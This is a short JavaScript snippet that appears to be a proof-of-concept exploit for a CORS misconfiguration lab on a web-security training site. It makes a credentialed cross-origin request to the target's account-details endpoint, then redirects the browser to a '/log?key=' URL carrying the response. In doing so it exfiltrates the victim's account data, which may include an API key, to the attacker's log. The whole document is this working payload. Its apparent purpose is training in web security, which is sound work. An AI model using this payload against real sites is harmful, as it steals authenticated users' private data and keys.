
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get',"http://acd61fe61e2c8447c047760800d40081.web-security-academy.net/accountDetails",true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='/log?key='+this.responseText;
};


